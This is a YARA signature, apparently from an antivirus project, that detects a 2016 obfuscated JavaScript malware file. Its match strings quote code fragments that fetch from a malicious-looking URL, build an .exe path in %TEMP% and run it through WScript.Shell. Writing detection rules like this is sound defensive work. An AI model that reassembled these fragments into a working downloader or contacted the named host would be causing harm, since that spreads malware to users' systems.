rule sig_20160401_62818f5f291464b819ce408069b7a9ce {
  meta:
    description = "datamaliciousorder - file 20160401_62818f5f291464b819ce408069b7a9ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dbe3a6d8b22b67d748e32c5235c913490b45f9eead36e084b2b4f51569283968"

  strings:
    $s1  = "GajViw[LwDt](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var NfRq = function MqeCh() {return WScript[WuJy](\"WScript\"+\".Shell\");}(), NzoKt = 11;" fullword ascii
    $s3  = "function JkdIbf(TzjHv, JeqPpv){DgmAsb = DgmAsb * 1; return TzjHv - JeqPpv;};" fullword ascii
    $s4  = "if (GajViw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XmUjm(){return SsIkr + \"\";};" fullword ascii
    $s6  = "function EhpKef() {return NfRq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cLcyzoj1enWomX.ex\" + \"e\";};" fullword ascii
    $s7  = "function DcDm() {return ((UaDfi == true) && (UaDfi == RixLx)) ? 1 : DgmAsb;};" fullword ascii
    $s8  = "var UaDfi = false;" fullword ascii
    $s9  = "UaDfi = true; " fullword ascii
    $s10 = "RixLx = true; " fullword ascii
    $s11 = "var CzZxv = false;" fullword ascii
    $s12 = "function SgmRw(){return 23;};" fullword ascii
    $s13 = "function QeqZb(){return WuJy;};" fullword ascii
    $s14 = "}while (NfuOe);" fullword ascii
    $s15 = "return JkdIbf(LlOks, QmGdw);" fullword ascii
    $s16 = "function GdHmr()" fullword ascii
    $s17 = "function HalSha(VlVp) {var MzUqe = (1, 2, 3, 4, 5, VlVp); return MzUqe;};" fullword ascii
    $s18 = "var OgFey = new this[\"Date\"]();" fullword ascii
    $s19 = "var RixLx = false;" fullword ascii
    $s20 = "function PiVp(WcxLp){NfRq[\"R\"+\"un\"](WcxLp, DgmAsb, DgmAsb);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}